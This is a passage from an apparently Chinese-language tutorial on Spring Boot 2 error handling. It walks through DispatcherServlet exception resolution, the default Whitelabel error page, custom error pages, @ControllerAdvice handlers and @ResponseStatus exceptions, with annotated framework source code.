class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle01</span><span class="hljs-params">()</span>&#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> / <span class="hljs-number">0</span>;<span class="hljs-comment">//将会抛出ArithmeticException</span><br><br>        log.info(<span class="hljs-string">&quot;Hello, Spring Boot 2!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Spring Boot 2!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当浏览器发出<code>/hello</code>请求，<code>DispatcherServlet</code>的<code>doDispatch()</code>的<code>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</code>将会抛出<code>ArithmeticException</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    ...<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>...<br><span class="hljs-comment">// Actually invoke the handler.</span><br>            <span class="hljs-comment">//将会抛出ArithmeticException</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br>applyDefaultViewName(processedRequest, mv);<br>mappedHandler.applyPostHandle(processedRequest, response, mv);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>                <span class="hljs-comment">//将会捕捉ArithmeticException</span><br>dispatchException = ex;<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>...<br>&#125;<br>    <span class="hljs-comment">//捕捉后，继续运行</span><br>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>triggerAfterCompletion(processedRequest, response, mappedHandler,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>...<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="hljs-meta">@Nullable</span> ModelAndView mv,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Exception exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">errorView</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-keyword">if</span> (exception != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (exception <span class="hljs-keyword">instanceof</span> ModelAndViewDefiningException) &#123;<br>...<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (mappedHandler != <span class="hljs-literal">null</span> ? mappedHandler.getHandler() : <span class="hljs-literal">null</span>);<br><span class="hljs-comment">//ArithmeticException将在这处理</span><br>                mv = processHandlerException(request, response, handler, exception);<br>errorView = (mv != <span class="hljs-literal">null</span>);<br>&#125;<br>&#125;<br>...<br>&#125;<br><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">processHandlerException</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">// Success and error responses may use different content types</span><br>request.removeAttribute(HandlerMapping.PRODUCIBLE_MEDIA_TYPES_ATTRIBUTE);<br><br><span class="hljs-comment">// Check registered HandlerExceptionResolvers...</span><br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">exMv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerExceptionResolvers != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//遍历所有的 handlerExceptionResolvers，看谁能处理当前异常HandlerExceptionResolver处理器异常解析器</span><br><span class="hljs-keyword">for</span> (HandlerExceptionResolver resolver : <span class="hljs-built_in">this</span>.handlerExceptionResolvers) &#123;<br>exMv = resolver.resolveException(request, response, handler, ex);<br><span class="hljs-keyword">if</span> (exMv != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>...<br><br>        <span class="hljs-comment">//若只有系统的自带的异常解析器（没有自定义的），异常还是会抛出</span><br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>系统自带的<strong>异常解析器</strong>：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211315638.png" alt="在这里插入图片描述"></p><ul><li><code>DefaultErrorAttributes</code>先来处理异常，它主要功能把异常信息保存到request域，并且返回null。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultErrorAttributes</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ErrorAttributes</span>, HandlerExceptionResolver, Ordered &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">resolveException</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> &#123;<br>        <span class="hljs-built_in">this</span>.storeErrorAttributes(request, ex);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">storeErrorAttributes</span><span class="hljs-params">(HttpServletRequest request, Exception ex)</span> &#123;<br>        request.setAttribute(ERROR_ATTRIBUTE, ex);<span class="hljs-comment">//把异常信息保存到request域</span><br>    &#125;<br>    ...<br>    <br>&#125;    <br></code></pre></td></tr></table></figure><ul><li><p>默认没有任何解析器（上图的<code>HandlerExceptionResolverComposite</code>）能处理异常，所以最后异常会被抛出。</p></li><li><p>最终底层就会转发<code>/error</code> 请求。会被底层的<code>BasicErrorController</code>处理。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicErrorController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractErrorController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(produces = MediaType.TEXT_HTML_VALUE)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">errorHtml</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>       <span class="hljs-type">HttpStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> getStatus(request);<br>       Map&lt;String, Object&gt; model = Collections<br>             .unmodifiableMap(getErrorAttributes(request, getErrorAttributeOptions(request, MediaType.TEXT_HTML)));<br>       response.setStatus(status.value());<br>       <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> resolveErrorView(request, response, status, model);<br>       <span class="hljs-comment">//如果/template/error内没有4**.html或5**.html，</span><br>       <span class="hljs-comment">//modelAndView为空，最终还是返回viewName为error的modelAndView</span><br>       <span class="hljs-keyword">return</span> (modelAndView != <span class="hljs-literal">null</span>) ? modelAndView : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;error&quot;</span>, model);<br>    &#125;<br>    <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        ...<br>     <span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>...<br>        <span class="hljs-comment">//渲染页面</span><br>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>        ...<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processDispatchResult</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerExecutionChain mappedHandler, <span class="hljs-meta">@Nullable</span> ModelAndView mv,</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> Exception exception)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">errorView</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        ...<br><span class="hljs-comment">// Did the handler return a view to render?</span><br><span class="hljs-keyword">if</span> (mv != <span class="hljs-literal">null</span> &amp;&amp; !mv.wasCleared()) &#123;<br>render(mv, request, response);<br><span class="hljs-keyword">if</span> (errorView) &#123;<br>WebUtils.clearErrorRequestAttributes(request);<br>&#125;<br>&#125;<br>...<br>&#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>...<br><br>View view;<br><span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> mv.getViewName();<br><span class="hljs-keyword">if</span> (viewName != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">// We need to resolve the view name.</span><br>            <span class="hljs-comment">//找出合适error的View，如果/template/error内没有4**.html或5**.html，</span><br>            <span class="hljs-comment">//将会返回默认异常页面ErrorMvcAutoConfiguration.StaticView</span><br>            <span class="hljs-comment">//这里按需深究代码吧！</span><br>view = resolveViewName(viewName, mv.getModelInternal(), locale, request);<br>...<br>&#125;<br>...<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">if</span> (mv.getStatus() != <span class="hljs-literal">null</span>) &#123;<br>response.setStatus(mv.getStatus().value());<br>&#125;<br>            <span class="hljs-comment">//看下面代码块的StaticView的render块</span><br>view.render(mv.getModelInternal(), request, response);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>...<br>&#125;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class &#125;)</span><br><span class="hljs-comment">// Load before the main WebMvcAutoConfiguration so that the error View is available</span><br><span class="hljs-meta">@AutoConfigureBefore(WebMvcAutoConfiguration.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(&#123; ServerProperties.class, ResourceProperties.class, WebMvcProperties.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorMvcAutoConfiguration</span> &#123;<br>    <br>    ...<br>        <br>   <span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;server.error.whitelabel&quot;, name = &quot;enabled&quot;, matchIfMissing = true)</span><br><span class="hljs-meta">@Conditional(ErrorTemplateMissingCondition.class)</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WhitelabelErrorViewConfiguration</span> &#123;<br><br>        <span class="hljs-comment">//将创建一个名为error的系统默认异常页面View的Bean</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StaticView</span> <span class="hljs-variable">defaultErrorView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StaticView</span>();<br><br><span class="hljs-meta">@Bean(name = &quot;error&quot;)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = &quot;error&quot;)</span><br><span class="hljs-keyword">public</span> View <span class="hljs-title function_">defaultErrorView</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.defaultErrorView;<br>&#125;<br><br><span class="hljs-comment">// If the user adds @EnableWebMvc then the bean name view resolver from</span><br><span class="hljs-comment">// WebMvcAutoConfiguration disappears, so add it back in to avoid disappointment.</span><br><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnMissingBean</span><br><span class="hljs-keyword">public</span> BeanNameViewResolver <span class="hljs-title function_">beanNameViewResolver</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">BeanNameViewResolver</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanNameViewResolver</span>();<br>resolver.setOrder(Ordered.LOWEST_PRECEDENCE - <span class="hljs-number">10</span>);<br><span class="hljs-keyword">return</span> resolver;<br>&#125;<br><br>&#125;     <br>   <br>    <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticView</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">MediaType</span> <span class="hljs-variable">TEXT_HTML_UTF8</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MediaType</span>(<span class="hljs-string">&quot;text&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, StandardCharsets.UTF_8);<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Log</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogFactory.getLog(StaticView.class);<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">if</span> (response.isCommitted()) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> getMessage(model);<br>logger.error(message);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>response.setContentType(TEXT_HTML_UTF8.toString());<br><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> model.get(<span class="hljs-string">&quot;timestamp&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> model.get(<span class="hljs-string">&quot;message&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">trace</span> <span class="hljs-operator">=</span> model.get(<span class="hljs-string">&quot;trace&quot;</span>);<br><span class="hljs-keyword">if</span> (response.getContentType() == <span class="hljs-literal">null</span>) &#123;<br>response.setContentType(getContentType());<br>&#125;<br>            <span class="hljs-comment">//系统默认异常页面html代码</span><br>builder.append(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&quot;</span>).append(<br><span class="hljs-string">&quot;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&quot;</span>)<br>.append(<span class="hljs-string">&quot;&lt;div id=&#x27;created&#x27;&gt;&quot;</span>).append(timestamp).append(<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>)<br>.append(<span class="hljs-string">&quot;&lt;div&gt;There was an unexpected error (type=&quot;</span>).append(htmlEscape(model.get(<span class="hljs-string">&quot;error&quot;</span>)))<br>.append(<span class="hljs-string">&quot;, status=&quot;</span>).append(htmlEscape(model.get(<span class="hljs-string">&quot;status&quot;</span>))).append(<span class="hljs-string">&quot;).&lt;/div&gt;&quot;</span>);<br><span class="hljs-keyword">if</span> (message != <span class="hljs-literal">null</span>) &#123;<br>builder.append(<span class="hljs-string">&quot;&lt;div&gt;&quot;</span>).append(htmlEscape(message)).append(<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (trace != <span class="hljs-literal">null</span>) &#123;<br>builder.append(<span class="hljs-string">&quot;&lt;div style=&#x27;white-space:pre-wrap;&#x27;&gt;&quot;</span>).append(htmlEscape(trace)).append(<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>);<br>&#125;<br>builder.append(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>response.getWriter().append(builder.toString());<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">htmlEscape</span><span class="hljs-params">(Object input)</span> &#123;<br><span class="hljs-keyword">return</span> (input != <span class="hljs-literal">null</span>) ? HtmlUtils.htmlEscape(input.toString()) : <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">(Map&lt;String, ?&gt; model)</span> &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> model.get(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Cannot render error page for request [&quot;</span> + path + <span class="hljs-string">&quot;]&quot;</span>;<br><span class="hljs-keyword">if</span> (model.get(<span class="hljs-string">&quot;message&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>message += <span class="hljs-string">&quot; and exception [&quot;</span> + model.get(<span class="hljs-string">&quot;message&quot;</span>) + <span class="hljs-string">&quot;]&quot;</span>;<br>&#125;<br>message += <span class="hljs-string">&quot; as the response has already been committed.&quot;</span>;<br>message += <span class="hljs-string">&quot; As a result, the response may have the wrong status code.&quot;</span>;<br><span class="hljs-keyword">return</span> message;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getContentType</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;text/html&quot;</span>;<br>&#125;<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="55、错误处理-【源码流程】几种异常处理原理"><a href="#55、错误处理-【源码流程】几种异常处理原理" class="headerlink" title="55、错误处理-【源码流程】几种异常处理原理"></a>55、错误处理-【源码流程】几种异常处理原理</h2><ul><li><p>自定义错误页</p><ul><li>error&#x2F;404.html   error&#x2F;5xx.html；有精确的错误状态码页面就匹配精确，没有就找 4xx.html；如果都没有就触发白页</li></ul></li><li><p><code>@ControllerAdvice</code>+<code>@ExceptionHandler</code>处理全局异常；底层是 <code>ExceptionHandlerExceptionResolver</code> 支持的</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@ControllerAdvice</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> &#123;<br><br>    <span class="hljs-meta">@ExceptionHandler(&#123;ArithmeticException.class,NullPointerException.class&#125;)</span>  <span class="hljs-comment">//处理异常</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleArithException</span><span class="hljs-params">(Exception e)</span>&#123;<br><br>        log.error(<span class="hljs-string">&quot;异常是：&#123;&#125;&quot;</span>,e);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>; <span class="hljs-comment">//视图地址</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>@ResponseStatus</code>+自定义异常 ；底层是 <code>ResponseStatusExceptionResolver</code> ，把responseStatus注解的信息底层调用 <code>response.sendError(statusCode, resolvedReason)</code>，tomcat发送的<code>/error</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ResponseStatus(value= HttpStatus.FORBIDDEN,reason = &quot;用户数量太多&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserTooManyException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> &#123;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-title function_">UserTooManyException</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-title function_">UserTooManyException</span><span class="hljs-params">(String message)</span>&#123;<br>        <span class="hljs-built_in">super</span>(message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TableController</span> &#123;<br>    <br><span class="hljs-meta">@GetMapping(&quot;/dynamic_table&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">dynamic_table</span><span class="hljs-params">(<span 